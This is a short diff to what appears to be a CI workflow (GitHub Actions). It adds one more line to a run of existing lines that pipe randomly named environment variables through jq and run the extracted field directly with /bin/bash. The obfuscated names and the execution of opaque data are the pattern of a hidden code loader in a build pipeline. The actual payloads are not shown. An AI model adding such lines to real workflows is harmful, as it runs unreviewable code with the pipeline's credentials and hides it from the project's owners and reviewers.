@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$kjae50559" | jq -r .tb4 | /bin/bash
           echo $brm1615 | jq -r .b3 | /bin/bash
           echo $z051 | jq -r .pvp5 | /bin/bash
+          printf '%s' "$xbuhh256" | jq -r .b7755 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
